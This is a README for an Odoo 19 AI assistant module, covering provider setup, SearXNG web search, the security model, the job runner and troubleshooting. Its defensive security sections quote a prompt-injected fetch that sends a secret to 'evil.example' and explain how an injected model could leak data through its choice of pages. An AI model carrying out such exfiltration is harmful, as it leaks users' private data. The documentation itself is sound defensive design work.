# OW AI Assistant

A clean-room, agentic AI assistant for Odoo 19 Community that works with
any OpenAI-compatible Chat Completions endpoint: OpenRouter (the default),
HostYourAI, OpenAI, a local Ollama, ... Three settings pick the provider
and the model: Base URL, an optional API key and the Default Model. By
Openworx.

This is the `19.0` branch (the lead branch). The `20.0` branch carries the
same module for Odoo 20; what a user notices differently here is listed
under "Differences from the 20.0 branch" below.

## Purpose

`ow_ai` gives internal users an AI agent they can chat with from the
Discuss messaging menu, a systray button, the command palette, or a
"Test in chat" button on the agent record itself. *Composers* configure
each entry point (the systray chat, a chat about a record): which agent
answers, extra instructions and prompt buttons, optionally scoped to a
specific model (e.g. `res.partner`); a chat opened from a record's form
gets that record as context. The agent can read Odoo data, propose and
(after confirmation) apply writes, ask the user questions mid-turn, and
load reusable "skills" (extra instructions/tools loaded on demand), and,
with a SearXNG instance configured, search the web and cite its sources.
Everything runs as the requesting user, through Odoo's normal access
rights -- the assistant is not a backdoor.

Each chat has its own switches in the composer's "More Actions" menu:
"Auto-approve actions" (off), "Web search" (see Web search) and "Show
steps" (off: the "Steps taken" list of the tools the assistant used
appears under its answers once the switch is on, and always in debug
mode).

## Requirements

- Odoo 19 Community.
- Python package `markdown2` (used to render the assistant's Markdown
  answers to sanitised HTML; a minimal built-in fallback is used if it is
  missing, with a warning logged at startup). The official `odoo:19.0`
  Docker image does not include it: add it to the production image
  (`pip3 install --break-system-packages markdown2`), otherwise the
  fallback converter renders the answers (plainer tables and lists).
  `requests` is in the image.
- `max_cron_threads >= 2` in `odoo.conf` (or `--max-cron-threads`): one
  worker only runs the AI job runner/sweeper and starves every other
  cron job in the database.
- `limit_time_real_cron >= 900`: a single cron run claims and runs jobs
  in a loop (see below) and must not be killed mid-turn.
- An OpenAI-compatible endpoint with a model that supports tool calling,
  plus its API key if the endpoint needs one (see Setup).
- Optional, for web search: a SearXNG instance with JSON output enabled
  (see Web search).

## Setup

1. **Provider.** In *Settings > AI > Configuration > Settings* (block
   "AI Provider") set the **Base URL** of the endpoint, its **API Key**
   and the **Default Model** (a model id at that endpoint):

   | Provider | Base URL | Key | Example model |
   |---|---|---|---|
   | OpenRouter (default) | `https://openrouter.ai/api/v1` | `sk-or-…` | `openai/gpt-6-luna` |
   | HostYourAI / Loes (EU) | `https://hostyourai.com/api/v1` | `hyai-…` | `hyai/loes-large` |
   | OpenAI | `https://api.openai.com/v1` | `sk-…` | `gpt-5-mini` |
   | Ollama (local) | `http://ollama:11434/v1` | none | `qwen2.5:3b` |

   The key is optional: leave it empty for an endpoint without
   authentication, and no `Authorization` header is sent. A key saved in
   Settings is stored as the `ow_ai.api_key` system parameter and never
   sent back to the browser (only a `…1234` hint); without one, the
   `OW_AI_API_KEY` environment variable is used (`OPENROUTER_API_KEY` is
   still honoured), then `ow_ai_api_key` in `odoo.conf`. The badge next to
   the field shows where the active key comes from; "Clear key" removes a
   stored key.

   **Test connection** asks the endpoint for its model list (`GET
   /models`) and reports "Connected. N models available.". Some endpoints
   serve that list without checking the key (OpenRouter does), so a wrong
   key there only shows in the first chat. A wrong Base URL gives "The AI
   provider rejected the request." with "Invalid Base URL: ..." (e.g. no
   `http://`/`https://` in front), "The endpoint did not return JSON." (a
   web page instead of the API root) or "HTTP 404"/"Not Found" (no `/v1`
   at the end) instead of a model count; a chat does not retry these.

   Tool calling (every read and write the agent does) and JSON-schema
   output (`_get_structured_response`, for modules building on `ow_ai`)
   depend on the model: pick one that supports both at that endpoint.
   Cost is stored only when the endpoint reports it in the response
   (`usage.cost`). OpenRouter does (without being asked); an endpoint
   that does not (e.g. OpenAI's own API, Ollama) leaves the cost column
   of *Reports > Usage* at 0, and its
   real spend is on the provider's own dashboard. Tokens and latency are
   always recorded.
2. **Default model.** The Default Model (`ow_ai.default_model`) is used
   by every agent that does not set its own model on its record. The
   shipped default is `openai/gpt-6-luna`, an OpenRouter model id: with
   another endpoint, set one of its own models.
   **Model choice (OpenRouter pricing):** `openai/gpt-6-luna` (USD 0.10 /
   0.50 per million input/output tokens, tool calling and JSON-schema
   output) is the cheapest model that passed our end-to-end checks.
   The cheaper `openai/gpt-4.1-nano` and `google/gemini-2.5-flash-lite`
   (0.10 / 0.40) were tried and misused the tools (wrong aggregate/order
   syntax, invented operators and ids, a date filter left out), so their
   answers were wrong. With the default a question costs roughly USD
   0.002 (a simple create) to 0.01 (a multi-step report).
   **Upgrading:** a module update only stores defaults for settings that
   are missing, so a database installed before this default changed keeps
   `openai/gpt-4.1-mini` after a module update; set `ow_ai.default_model`
   to `openai/gpt-6-luna` (or another tool-capable model) yourself in
   *Settings > AI*.
3. Review the other Settings fields (max rounds, max tool calls per
   round, timeout, job staleness, tool result/history size limits) -- the
   defaults are sane for most installs.
4. Install the module, then create or edit agents under *AI > Agents*.

**Upgrading to 19.0.1.1.0.** Two safeguards of 19.0.1.0.0 are gone. The
monthly spend cap: set a credit limit on the API key at the provider
instead (OpenRouter: the key's credit limit). The "Deny Data Collection"
flag: set the data policy in the provider's own privacy settings instead
(OpenRouter: the account's privacy settings); prompts include Odoo record
data. Their `ir.config_parameter` rows (`ow_ai.monthly_budget`,
`ow_ai.data_collection_deny`) stay in the database and are ignored.

**Upgrading to 19.0.2.1.2.** Fixes an update that failed with
`duplicate key value violates unique constraint
"ir_config_parameter_key_uniq"` (key `ow_ai.web_search_url` or another
text setting). Saving Settings with an empty text field unsets that
parameter, so a value saved later was a new row the old data file tried
to create again. The defaults are now stored by a function that only
fills in missing settings; nothing to do but update.

**Upgrading to 19.0.2.0.0.** Nothing to do: the web-search settings are
created with their defaults, and web search stays off until a SearXNG URL
is set (see Web search). The update links the new "Web Search" skill to
the default agent.

## Web search

With a [SearXNG](https://docs.searxng.org/) instance configured, an agent
can search the public web and read pages, on any provider and model that
does tool calling, without a paid search API or key. The chat shows each
step ("Searched the web for “…” (5 results)", "Read www.odoo.com: …"),
and the answer cites its sources as small numbered pills with a numbered
list of the cited pages under it.

**SearXNG.** Run your own instance (or use one you trust) and let it
answer in JSON: its `settings.yml` needs

```yaml
search:
  formats:
    - html
    - json
```

(SearXNG serves only `html` by default). Odoo sends `GET <SearXNG
URL>/search?q=…&format=json&safesearch=1`, plus `language` and, when the
model asks for recent results, `time_range`, with `Accept:
application/json` and no cookies. If the instance runs SearXNG's limiter
(bot detection), let the Odoo server's address pass; otherwise it may
refuse the searches (HTTP 429).

**Engines.** SearXNG itself asks upstream engines (Google, Bing, Brave,
DuckDuckGo, Startpage, ...). Those rate-limit or show a CAPTCHA to a busy
or data-centre address, and SearXNG then suspends the engine for a while
(by default an hour after "too many requests", a day after a CAPTCHA:
`search.suspended_times` in `settings.yml`). With every engine suspended
the instance answers with 0 results: the chat shows "Searched the web for
“…” (0 results)" and the tool answers the model "No results; try other
words or a broader query. Search engines unavailable: brave (too many
requests), duckduckgo (CAPTCHA)." (the engine list comes from SearXNG's
`unresponsive_engines`), so the answer can tell the user why. Instances
are often in that state (engines suspended for too many requests or
blocked by a CAPTCHA), so enable several general engines of
different operators (e.g. bing, brave, duckduckgo, google, mojeek, qwant,
startpage), so that one suspended engine does not empty the results, and
check the instance's own log when "Test search" keeps reporting 0 results.

**Settings** (*OW AI > Configuration > Settings*, block "Web search";
administrators only):

| Setting | Parameter | Default | Meaning |
|---|---|---|---|
| SearXNG URL | `ow_ai.web_search_url` | empty | Base URL of the instance, e.g. `http://searxng:8080` or `https://search.example.org` (a trailing `/` is dropped). Empty = web search is off for everyone: no switch in the chat, no web tools for the model, and "Test search" answers "Web search is not configured." |
| Results | `ow_ai.web_search_results` | 5 | Results per search handed to the model (1 to 10). |
| Web Timeout (s) | `ow_ai.web_timeout` | 15 | Time limit in seconds (at least 1). A page read (host lookups, redirects and body together) is cut at this limit and fails with "timeout": it ends at the limit plus at most one wait for the server (connecting, or waiting for its response headers); only a server that sends its headers a byte at a time can stretch it further. The search request to SearXNG keeps the HTTP library's per-wait timeout (for connecting and for each wait for data). |
| Language | `ow_ai.web_search_language` | empty | SearXNG `language`, e.g. `nl`; empty = the chatting user's language (`nl_NL` gives `nl`). |
| On by Default | `ow_ai.web_search_default` | off | Whether new chats start with the "Web search" switch on. |

**Test search** runs a search for "Odoo" and reports "Search works: N
results." or the error. "Search works: 0 results." means the instance
answered but its engines returned nothing (see Engines).

**The switch in the chat.** An AI chat's composer menu has a "Web search"
switch (search icon, between "Auto-approve actions" and "Show steps"). It
is shown only while a SearXNG URL is set, and a new chat starts with it on
when *On by Default* is on. With the switch off the model sees neither the
web tools nor the "Web Search" skill (a skill loaded earlier in the chat
leaves the prompt and comes back when the switch is on again); a change
applies from the assistant's next step, also in the middle of an answer
(sources a turn already collected still render in its answer).
*Reports > Sessions* shows the switch as "Web Search". Direct (non-chat)
calls from other modules get only the tools their caller passes.

**Skill and tools.** The native skill "Web Search" bundles the tools
`web_search` (tool "Web Search") and `fetch_web_page` (tool "Fetch Web
Page"). Its instructions: search with a short query and refine once, read
the snippets and open at most three pages (using `offset` to continue a
long page), cite `[WEB_SOURCE:n]` right after each claim from result n,
never fetch a URL that was not in the results or the user's message, say
when the results are inconclusive, and the per-turn limits below. The
skill is linked to the default agent, and native skills are synced to it:
every module update links the skill again, so removing it from the
default agent does not last. The administrator's controls are therefore
the SearXNG URL (empty = off for everyone) and *On by Default* (off, the
default: new chats start with the switch off; users turn it on per chat);
the per-chat switch is the user's control. Other agents only get the
skill when an administrator adds it to them.

**Citations and sources.** The tools number every result and every page
read during a turn (numbering continues across the turn's searches) and
keep the numbers with their URL, title and host in the turn's source
table. The model writes `[WEB_SOURCE:n]` (or `[WEB_SOURCE:1,3]`); the
answer shows each as a superscript pill linking to that URL, and a
numbered list of the cited pages (title, host) under the answer. The
links come only from that table, never from text the model wrote, so a
link the model writes itself is still turned into plain text like any
other external link (see Security model). A number that is not in the
table shows as plain `[n]` without a link. The table is dropped when the
turn ends: in a later turn the model searches again before citing.

**What a page read returns.** `fetch_web_page` returns the page's title
and text; the response's content type decides how: HTML (`text/html`,
`application/xhtml+xml`) is reduced to text (scripts, styles, icons,
navigation, headers, footers, sidebars, forms and comments dropped, the
text around them kept; `<main>`/`<article>` preferred), JSON is
pretty-printed, plain text is kept as is. It returns 8,000
characters at a time by default (at most *Max Tool Result Characters*);
the model continues with `offset` while `truncated` is true. Pages larger
than 5 MB are cut there.

**Limits per turn.** At most 5 searches and 5 page reads per turn; the
next call gets "Web search limit reached for this turn (5)." (or "Web
fetch ..."). Every attempt counts, also one that fails: a search without
results, a page read that fails (HTTP error, timeout, unreachable) or that
is refused (allow-list, SSRF guard). Calls refused before the tool runs are
not counted: invalid arguments, an unknown tool (e.g. a web tool called
while the switch is off) and calls over *Max Tool Calls per Round*.

**Security.**

- *Fetch allow-list.* `fetch_web_page` only opens a URL that is one of
  this turn's search results or that the user typed in one of their own
  messages of this chat (text of an attached file counts as the user's).
  URLs from tool results or from the assistant's own text never count.
  Anything else gets "Only pages from search results or from the user's
  message can be fetched." before any request is made, so a
  prompt-injected "fetch https://evil.example/?q=<secret>" goes nowhere.
- *SSRF guard,* on the first request and on every redirect (followed by
  Odoo itself, at most 5): `http`/`https` only; no user name or password
  in the URL; ports 80, 443, 8080 and 8443 only; the host must be a valid
  name or IP address (internationalised names are converted to their ASCII
  form, and that same host is both checked and sent); every
  address the name resolves to must be public (no loopback, private,
  link-local, carrier-grade NAT, multicast, reserved or unspecified
  address, no metadata address 169.254.169.254; IPv4-mapped and NAT64 IPv6
  addresses are checked as the IPv4 address inside). Only `text/html`,
  `application/xhtml+xml`, `text/plain` and `application/json` are read;
  proxy environment variables are ignored for page reads. The SearXNG URL
  itself is not guarded (the administrator set it, and an internal
  `http://searxng:8080` must work).
- *Connections are pinned to the checked addresses.* Every request (each
  redirect hop too) connects to an address the guard checked, never
  resolving the host name a second time, so a domain whose DNS answers a
  public address to the check and an internal one a moment later (DNS
  rebinding) never reaches the internal one. The checked addresses are
  tried in turn while a connection cannot be opened (refused, no route,
  no answer within 10 seconds), never after a TLS or read failure. The
  host name (without a trailing dot) still goes in the `Host` header and,
  for https, is the TLS server name the certificate is verified against
  (normal certificate checks, never skipped). Failures are reported with
  fixed texts that name no address.
- *Residual risk: slow response headers.* A server that sends its
  response headers a byte at a time can stretch a page read past *Web
  Timeout* (see that setting); the body itself is always cut there.
- *Residual risk: steering.* With the switch on, the model chooses the
  query (including `site:` and the words), so it can steer which indexed
  pages a search returns, and then fetch one of them. A prompt-injected
  model can so leak a few bits per page read to someone watching their
  own site's log (at most 5 page reads per turn, see Limits).
  Search queries themselves go to the SearXNG instance and from there to
  the enabled engines. Users who handle sensitive data should keep the
  switch off in those chats.

## Security model

- **Tools run as the requesting user.** Every read/write/introspection
  tool call executes in that user's own environment; Odoo's normal
  access rights, record rules and field-level security apply exactly as
  if the user had made the change by hand. The assistant cannot see or
  touch anything the user could not.
- **Confirmation for writes.** A tool marked `is_write` (creates or
  updates records) pauses the turn and posts a confirmation card; nothing
  is written until the user (or `auto_confirm` on the session, when
  explicitly enabled for that chat) approves it.
- **Model blocklists.** Built-in tools refuse a fixed set of sensitive
  models outright (security and authentication internals, API keys,
  system parameters, the bus, automation rules, `ir.*` and `ow.ai.*`
  models, ...) and keep another set read-only (companies, users, bank
  accounts, messages, ...), regardless of the calling user's own access
  rights. There is no separate field blocklist: field-level security is
  Odoo's own (a field the user cannot read, such as a password hash, is
  just as unreadable to the assistant).
- **Access groups.** *AI User* (implied by every internal user) can chat
  with agents; *AI Manager* additionally configures agents, tools,
  skills and prompts and gets *Reports > Sessions/Jobs/Usage*. The
  conversation transcripts (session events), the session content (tool
  state, request context, a paused batch's tool arguments and results
  and its resume token, the notification buffers, the last error, the
  turn id) and the job data (request context, payload, error detail) are
  readable by
  administrators (*Settings* group) only: AI Managers see the
  operational fields (agent, user, turn state, rounds, settings). The
  chat's own member gets what the chat window needs (the pending card
  and its resume token) from the server with the chat, never by reading
  the session. Only administrators change the AI settings (Base URL,
  API key, default model, limits).
- **Agent contacts.** An agent's contact (its name and avatar in the
  chat) is created by the assistant, archived, when the agent is
  created; a duplicated agent gets a contact of its own. An AI Manager
  cannot bind an agent to an existing contact (only the superuser can,
  e.g. from a data file), and deleting an agent deletes only a contact
  the assistant created for it (flagged *AI Agent Contact*, a flag only
  administrators can read or set), never another one. Older versions
  left no record of which contact they created, so the upgrade flags an
  existing agent's contact only when it looks exactly like one the
  assistant creates (archived, a plain contact without company, parent,
  child contact, user, email, phone or tax id, and no external id of
  another module); any other stays unflagged and survives its agent.
  19.0.2.1.1 takes the flag off every flagged contact that fails that
  check: contacts 19.0.2.1.0 flagged without it, and also a contact the
  assistant did create but that was edited since (given an email, say),
  which then stays behind, archived, when its agent is deleted (the safe
  direction).
- **One job, one turn.** Every turn gets its own random id (next to the
  round number, which restarts at 1 for every turn of the same user); an
  `agent_round` job records the turn it was queued for and only ever runs
  while the session still waits on that exact turn, so a job left over
  from a turn that already ended or moved on (a slow retry, a crashed
  worker's leftover) can never be mistaken for the session's current one.
  A job queued before jobs carried a turn id never runs (nor is retried)
  once the session has one; the upgrade to 19.0.2.1.1 marks such pending
  or failed jobs that can no longer run as failed, "Superseded by the
  turn-id upgrade".
- **Two-member AI chats.** An AI chat has exactly two members, the user
  and the agent; nobody can invite or add anyone, not through the
  interface and not through RPC. The exception that lets those two
  members be created applies only to the assistant's own (sudo) chat
  setup: the context key it uses does nothing when a client sends it.
- **The API key never reaches the browser.** It is read server-side only
  (from the `ow_ai.api_key` parameter, the `OW_AI_API_KEY`/
  `OPENROUTER_API_KEY` environment variable or `ow_ai_api_key` in
  `odoo.conf`) when a request is made to the AI provider; the config
  form never echoes a previously-saved key back, only a `…1234`-style
  hint. A key from the environment or `odoo.conf` is sent to whatever
  Base URL is configured ("Clear key" only removes a key saved in
  Settings): remove it there before pointing the Base URL at an endpoint
  that must not see it.
- **Exfiltration-safe HTML.** Every bit of HTML the assistant posts goes
  through a single choke point (`engine/html_output.py`) that renders
  Markdown, sanitises the result, and strips anything that could leak
  data through a GET request (tracking pixels, external images/iframes,
  `javascript:`/`url(...)` values, etc.) before it is stored as a
  message. Links to another host are turned into plain text (host shown),
  and CSS classes the model wrote itself are dropped (no fake cards or
  overlays), except a code block's language.
- **Web search** reads only pages from the turn's search results or URLs
  the user typed, through an SSRF guard; citation links come only from
  the tools' source table, and connects only to the address it checked
  (no DNS rebinding); a prompt-injected model can leak a few bits through
  its choice of pages: see "Security" under Web search.

## How the job runner works

Model requests never run inside an HTTP request: posting a message
stores the turn and enqueues an `ow.ai.job` (`kind='agent_round'`), then
returns immediately. Answering a paused confirmation/question/client-tool
card runs the rest of that round's tool batch right in the answering
request (tools only, no model call), then enqueues the next round the
same way.
The `AI: run agent jobs` cron (`ow_ai.ir_cron_job_runner`) is woken up
(`ir.cron._trigger`) and claims jobs one at a time with `FOR UPDATE SKIP
LOCKED`, committing the claim before running the round so a crashed
worker leaves a `running` row a crash cannot hide; each job runs as its
own user (never as the cron's superuser) inside a savepoint and commits
after every job. Only a retryable provider error (a rate limit, a
transport timeout, a provider error such as a 5xx) is retried with
backoff (up to 3 attempts); anything else fails the job and, if it was
the round a session was waiting for, ends that turn with a short,
user-facing apology.

A second cron, `AI: sweep stale jobs` (`ow_ai.ir_cron_job_sweeper`),
fails jobs a dead worker left `running` too long (chat jobs: after
`ow_ai.job_stale_minutes`, 10) or that stayed pending too long (chat
jobs: an hour), expires forgotten confirmation/question cards, and
garbage-collects old finished jobs. The limits are per job kind
(`ow.ai.job._sweep_limits`): modules adding slower kinds give them more
time.

**What to monitor:**

- *Reports > Jobs* (AI Manager) lists every job with its state and
  attempt count (its error detail is shown to administrators only);
  filter on *Failed* to see what needs attention, and use the
  *Retry*/*Cancel* buttons (failed -> pending, requeued through the same
  cron trigger, offered only while the session still waits for that
  round; pending/failed -> cancelled).
- *Reports > Sessions* shows each conversation's `loop_state`, its
  current round vs. round limit, and its `last_error`; a manager can
  *Abort pending* a session stuck waiting on a confirmation/question/
  client-tool result, or *Open chat* to see the conversation in Discuss.
- *Reports > Usage* (list/pivot/graph) tracks tokens, latency and (when
  the endpoint reports it) cost per model, user, agent, kind and company,
  for troubleshooting.

## Troubleshooting

- **No answer arrives.** Check *Reports > Jobs*: if a job is stuck
  `pending`, the cron worker most likely is not running (`max_cron_threads`
  too low, or the cron is disabled) -- also check *Reports > Sessions*
  for a `loop_state` of `waiting_model` that never resolves.
- **A "402"/"payment required" or "401"/"invalid key" apology.** The
  AI provider account is out of credit or the API key is missing/invalid;
  check *Settings > AI > Configuration > Settings* and use "Test
  connection" (it lists the models at the configured endpoint's
  `/models`; some endpoints serve that list without checking the key).
- **"Invalid Base URL" or "The endpoint did not return JSON."** The Base
  URL misses its `http://`/`https://`, or points at a web page instead of
  the API root: use the `/v1` root as in the table under Setup.
- **"HTTP 404" or "Not Found".** The Base URL is missing `/v1` (e.g.
  `http://ollama:11434`): add `/v1`.
- **No "Web search" switch in the chat, or "Web search is not
  configured."** The SearXNG URL is empty (*OW AI > Configuration >
  Settings*, block "Web search").
- **"The search service did not return JSON: enable format 'json' in
  SearXNG's settings.yml."** Add `json` to `search.formats` (see Web
  search), or the URL points at a web page (a login or proxy page) instead
  of the instance.
- **"The search service answered HTTP 429" (or 403), "could not be
  reached" or "did not answer in time".** The instance's limiter refuses
  Odoo's address, or the URL/network is wrong, or *Web Timeout (s)* is too
  short.
- **"Search works: 0 results." or "No results; ... Search engines
  unavailable: brave (too many requests), duckduckgo (CAPTCHA)."** The
  instance answers but its upstream engines are suspended (rate limit or
  CAPTCHA). Wait for the suspension to end, enable other engines, or run
  the instance from another address (see Engines under Web search).
- **"Only pages from search results or from the user's message can be
  fetched."** The model tried a URL it did not get from this turn's
  search or from you: paste the URL into your message.
- **"The page cannot be fetched (blocked address): ..."** The page is on
  an internal or non-public address (or redirects there); such pages are
  never read.
- **A job keeps failing and retrying.** Its `error` field (*Reports >
  Jobs*, or the Jobs tab of the session in *Reports > Sessions*; visible
  to administrators) carries the provider's own message/traceback (never
  shown to the end user).

## Extending

- **Register a built-in tool.** Decorate a function with
  `@builtin_tool('your.key', is_write=True/False)` (see
  `engine/tools_registry.py`); then create (or let a data file create) an
  `ow.ai.tool` record with `kind='builtin'` and that `builtin_key`, so an
  agent can be given it as a default tool or load it through a skill.
  The chat shows the call as a one-line summary from its
  `ToolResult.summary` (`{'icon': 'search', 'text': '...'}`): the icon
  name becomes a Font Awesome class through `ICON_CLASSES` in
  `engine/html_output.py` (a name missing there shows a cog).
- **Add a skill.** Create an `ow.ai.skill` record with its own
  instructions and the tools it needs (`tool_ids`); agents that list it
  in `skill_ids` can load it mid-conversation with the built-in
  `interaction.load_skills` tool. A loaded skill's instructions and
  tools then stay available for the rest of that chat session. Native
  skills added by a module update are linked to the default agent
  automatically.
- **Add a job kind.** Extend `ow.ai.job.kind` with `selection_add` and
  define `_run_kind_<kind>(self, env, session)`: `_run_one` calls it as the
  job's user inside a savepoint. Raise `JobFailed(user_message, detail)`
  (`models/ow_ai_job.py`) to fail the job with a short message; an
  `AIProviderError` is handled like in a chat round: only a retryable one
  (rate limit, transport timeout, provider error) is retried, any other
  fails the job. `_enqueue(..., values=)`
  stores extra field values (lookup fields) on the new job, and
  `_enqueue(..., wake=False)` leaves waking the runner cron to the caller
  (one `_wake_runner()` after queuing many jobs). The caller's `default_*`
  context keys never become job or session values. The inline context key
  `ow_ai_inline_jobs` only counts in test mode.
  `ow_ai_automation` (on the `20.0` branch only for now) uses this for its
  `field_backfill` and `server_action` jobs.
- **Server-action tools** are not available in this version: the
  `kind='server_action'` value exists on `ow.ai.tool`, but a constraint
  refuses such tools until a later version implements running them.

## Differences from the 20.0 branch

Odoo 19 has a different Discuss client and a different icon set, so a user
of the `19.0` module notices these differences from `20.0`:

- **Icons** are Font Awesome 4 glyphs (`fa fa-...`) instead of Material
  Symbols: same meaning, different drawings (for example a magic wand
  `fa-magic` for "Ask AI", `fa-file-text-o` for loaded skills, a spinning
  `fa-refresh`). A tool summary icon name missing from `ICON_CLASSES`
  (e.g. a third-party tool's Material name) shows a cog; on 20 any Material
  name rendered.
- **Messaging menu (desktop):** 19 has no tab bar on desktop, so "OW AI"
  is a header filter after "Channels", with the unread counter. While it is
  active, "New chat" replaces "New Message" in the header, and the empty
  state ("No AI chat yet") has a "New chat" button. The 20 "Unread"
  sub-filter is gone (19 has no tab filters), and "Notifications" lists AI
  chats together with every other conversation, as 19 does for all types.
- **Mobile:** the AI tab sits in the bottom tab bar, but "New chat" is only
  in that tab's empty state (19's mobile messaging menu has no per-tab
  header action); the systray "Ask AI" still starts a chat.
- **Discuss app:** AI chats sit in an "OW AI" sidebar category below
  "Direct messages" (19's Discuss has categories, not tabs). Its "+" (New
  AI chat) shows only while the category is visible, i.e. once there is an
  AI chat.
- **Composer AI settings** ("Auto-approve actions", "Web search", "Show
  steps") are plain entries in the composer's "More Actions" menu, without
  the "AI chat settings" group header (19's composer renders no action
  groups).
- **Bot badge:** the agent's partner is marked as a bot the 19 way
  (`im_status` "bot", set client-side), so it gets the heart "Bot" badge
  like OdooBot and counts as online in member lists.
- **Code blocks** in answers are highlighted with Prism directly (19 mounts
  no embedded components in messages); they look the same, and the `<pre>`
  carries `data-language-id` instead of `data-embedded`.
- **Links written as `/\host/...`** stay a link to this Odoo host instead
  of becoming text (see Known limitations).
- **Security:** besides its own record rule, installing `ow_ai` takes the
  delete permission off mail's `discuss.channel` membership rule
  (`mail.ir_rule_discuss_channel_all`), because 19 OR-combines it with the
  AI chat rule. In stock 19 only administrators can delete channels, and
  they have their own rule, so nothing else changes. Mail's rule is
  `noupdate`, so `ow_ai` takes the permission off again on every install
  and update; the rule is not restored when `ow_ai` is uninstalled. The
  delete permission every AI user (every internal user) holds on
  `discuss.channel` relies on no other `discuss.channel` group rule granting
  delete: a module whose group rule there leaves `perm_unlink` on would let
  the AI users in that group delete every channel of the rule's domain
  (`test_security.py` fails on such a rule).
- **Provider settings:** the OpenAI-compatible provider settings (Base
  URL, optional key; no monthly budget, no "Deny Data Collection") are on
  19.0 first; 20.0 keeps its OpenRouter-only settings until they are
  forward-ported.
- **Web search** (SearXNG, `web_search`/`fetch_web_page`, citations, the
  per-chat switch) is on 19.0 first; 20.0 gets it with the forward-port.
- **Not on 19 yet:** `ow_ai_automation` (AI fields and AI server actions).

## Known limitations

- No streaming: an answer appears only once the model round is fully
  done (though intermediate tool-call "steps" are posted as the turn
  progresses).
- No realtime speech-to-text/voice input.
- No tools that read or drive the current Odoo *view* (list/kanban/form
  state); tools operate on data, not on the UI the user happens to be
  looking at.
- A link the model writes as `/\host/...` is not turned into text as on
  20: the libxml2 2.9 in the `odoo:19.0` image percent-encodes the
  backslash while sanitising, so it becomes `/%5Chost/...`, a link to a
  (non-existent) page on this Odoo host. Nothing leaves the host, so it
  cannot leak data; the user just gets a 404 if they click it.
- Web search: SearXNG is the only backend (no provider-native search, no
  paid search API); pages are read as delivered, so a page that builds
  its content with JavaScript reads as (nearly) empty, and PDFs and images
  are not read; robots.txt is not consulted for these single, user-driven
  page reads; pages are not cached.
